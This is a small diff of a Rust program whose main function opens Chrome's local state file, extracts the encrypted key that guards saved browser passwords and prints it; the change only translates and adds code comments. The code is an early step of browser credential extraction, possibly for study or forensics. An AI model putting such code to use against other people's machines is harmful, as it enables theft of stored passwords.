@@ -41,8 +41,8 @@ fn main() -> Result<(), Box<dyn Error>> {
 
     let local_pass_path_file = File::open(get_chrome_local_pass_path())?;               // open file from command line arguments            
     let encrypted_key = extract_encrypted_key(local_pass_path_file)
-        .unwrap_or_default();  // Utilizza una stringa vuota se c'è un errore
-    println!("Encrypted key: {}", encrypted_key);
+        .unwrap_or_default();  // Use an empty stringa if there is an error
+    println!("Encrypted key: {}", encrypted_key);                                       // extract_encrypted_key() returns a Result => can't simply print the result (need to handle err)
 
 
     Ok(())
